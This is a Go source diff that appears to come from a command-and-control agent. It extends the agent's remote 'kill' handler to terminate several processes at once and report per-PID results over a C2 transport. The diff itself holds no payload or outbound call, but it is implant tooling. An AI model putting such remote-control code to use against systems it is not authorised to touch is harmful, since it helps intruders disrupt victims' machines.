@@ -2,9 +2,11 @@ package handler
 
 import (
 	"bytes"
+	"fmt"
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -13,23 +15,89 @@ import (
 	"github.com/spf13/cobra"
 )
 
-// killCmdRun kills the specified process.
+// killCmdRun kills the specified process(es).
 func killCmdRun(cmd *cobra.Command, args []string) {
+	// Check if PIDs are provided via positional arguments (support both modes)
+	var pidsToKill []int
+
+	// First try to get PID from flag
 	pid, _ := cmd.Flags().GetInt("pid")
-	if pid == 0 {
-		c2transport.C2RespPrintf(cmd, "error: no pid specified")
+	if pid != 0 {
+		pidsToKill = append(pidsToKill, pid)
+	}
+
+	// Then parse any positional arguments as PIDs
+	for _, arg := range args {
+		// Clean up the argument (remove any trailing '+' from CC operator)
+		cleanArg := strings.TrimSuffix(arg, "+")
+		if cleanArg == "" {
+			continue
+		}
+
+		// Handle space-separated PIDs in a single argument
+		pidStrs := strings.Fields(cleanArg)
+		for _, pidStr := range pidStrs {
+			parsedPid, err := strconv.Atoi(pidStr)
+			if err != nil {
+				c2transport.C2RespPrintf(cmd, "Error: invalid PID '%s': %v", pidStr, err)
+				return
+			}
+			if parsedPid <= 0 {
+				c2transport.C2RespPrintf(cmd, "Error: invalid PID '%d': PID must be positive", parsedPid)
+				return
+			}
+			pidsToKill = append(pidsToKill, parsedPid)
+		}
+	}
+
+	if len(pidsToKill) == 0 {
+		c2transport.C2RespPrintf(cmd, "Error: no PID specified. Usage: kill <pid> [pid...] or kill --pid <pid>")
 		return
 	}
-	proc, err := os.FindProcess(pid)
-	if err != nil {
-		c2transport.C2RespPrintf(cmd, "Failed to find process %d: %v", pid, err)
-		return
+
+	var results []string
+	var hasErrors bool
+
+	for _, targetPid := range pidsToKill {
+		// Check if process exists first
+		proc, err := os.FindProcess(targetPid)
+		if err != nil {
+			hasErrors = true
+			// On Unix-like systems, FindProcess rarely fails, but let's handle it
+			results = append(results, fmt.Sprintf("PID %d: Failed to find process: %v", targetPid, err))
+			continue
+		}
+
+		// Attempt to kill the process
+		err = proc.Kill()
+		if err != nil {
+			hasErrors = true
+			// Provide more specific error messages
+			if strings.Contains(err.Error(), "no such process") {
+				results = append(results, fmt.Sprintf("PID %d: Process not found (may have already exited)", targetPid))
+			} else if strings.Contains(err.Error(), "permission denied") {
+				results = append(results, fmt.Sprintf("PID %d: Permission denied (insufficient privileges)", targetPid))
+			} else if strings.Contains(err.Error(), "operation not permitted") {
+				results = append(results, fmt.Sprintf("PID %d: Operation not permitted (may be a system process)", targetPid))
+			} else {
+				results = append(results, fmt.Sprintf("PID %d: Failed to kill process: %v", targetPid, err))
+			}
+		} else {
+			results = append(results, fmt.Sprintf("PID %d: Successfully killed", targetPid))
+		}
 	}
-	if err = proc.Kill(); err != nil {
-		c2transport.C2RespPrintf(cmd, "Failed to kill process %d: %v", pid, err)
-		return
+
+	// Format the output
+	status := "Success"
+	if hasErrors {
+		status = "Partial failure"
+		if len(pidsToKill) == 1 {
+			status = "Failed"
+		}
 	}
-	c2transport.C2RespPrintf(cmd, "Process %d killed", pid)
+
+	output := fmt.Sprintf("Kill operation result (%s):\n%s", status, strings.Join(results, "\n"))
+	c2transport.C2RespPrintf(cmd, "%s", output)
 }
 
 // execCmdRun executes a command and returns its output.
